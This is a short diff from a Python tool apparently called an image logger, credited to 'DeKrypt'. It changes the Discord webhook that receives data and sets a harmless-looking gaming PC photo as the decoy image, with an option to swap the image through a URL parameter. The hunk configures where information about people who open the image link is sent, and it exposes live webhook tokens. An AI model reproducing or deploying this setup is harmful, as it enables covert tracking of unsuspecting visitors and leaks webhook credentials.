@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1444750666147823716/JwwJ9Q35FydrBYyNitehiHGIzasLlj_UJmIwKS3oQefIEH3S64utzQnthdr80niHh97x",
+    "webhook": "https://discord.com/api/webhooks/1453081818571084018/LraS9qyIiSzq5ZhWoqjAOln4giT5Iz_sh4boG9gnXLamQWGg6Mux9FNRZ6g-EDsG7hUU",
     "image": "https://static.cybertron.com/clx/home/pcs-laps-section/custom-gaming-pcs.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
